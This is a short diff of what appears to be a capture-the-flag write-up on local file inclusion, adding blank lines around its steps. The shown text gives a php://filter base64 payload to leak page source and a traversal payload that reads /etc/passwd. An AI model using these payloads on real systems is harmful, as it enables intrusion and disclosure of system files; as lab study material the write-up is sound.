@@ -8,10 +8,12 @@ So, We you made this in the URL :
 ```
 ?view=php://filter/convert.base64-encode/resource=cat../../index
 ```
+
 We can get source home page in base64, with this commande we can decode him: 
 ```
 echo "Base64 Here" | base64 -d
 ```
+
 It take this: 
 ```
 <!DOCTYPE HTML>
@@ -53,4 +55,5 @@ So we can see, the logic of code. If we put ext=, we can get the passwd file, li
 ```
 ?view=cat/../../../../etc/passwd&ext=
 ```
+
 <img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/bd483e4b-374e-4748-ade9-54a94692f117" />
